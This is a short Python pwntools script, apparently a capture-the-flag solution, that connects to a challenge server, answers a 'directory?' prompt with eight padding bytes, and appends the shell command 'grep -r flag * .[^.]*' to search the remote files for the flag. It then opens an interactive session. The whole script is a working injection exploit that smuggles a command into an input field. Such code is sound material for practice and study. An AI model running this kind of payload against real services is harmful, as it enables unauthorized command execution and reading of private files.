from pwn import *

io = remote('pwn.bbctf.fluxus.co.in', 4001)

io.recvuntil(b'directory?')
payload = b'a'*8 + b'grep -r flag * .[^.]*'
io.sendline(payload)
io.interactive()
